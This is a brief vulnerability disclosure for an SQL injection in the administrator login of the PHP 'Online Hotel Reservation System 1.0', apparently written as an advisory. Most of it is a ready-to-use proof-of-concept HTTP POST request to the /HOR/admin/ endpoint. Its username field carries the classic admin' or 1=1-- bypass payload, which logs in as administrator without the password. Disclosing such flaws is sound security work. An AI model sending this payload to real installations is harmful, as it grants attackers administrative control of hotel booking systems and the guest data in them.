## Online Hotel Reservation System has an SQL injection vulnerability

## Affected version: 
Online Hotel Reservation System - 1.0

## Software:
https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code/

## Vulnerability File:
/HOR/admin/

## Description:
The administrator login interface of this online hotel system has an SQL injection vulnerability, allowing attackers to log in with a universal password by constructing specific statements.

Status: Moderate

POC
```
POST /HOR/admin/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/HOR/admin/
Cookie: PHPSESSID=db5no8dvip725j5p64esp3qbge
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin%27+or+1%3D1--+&password=s&login=
```






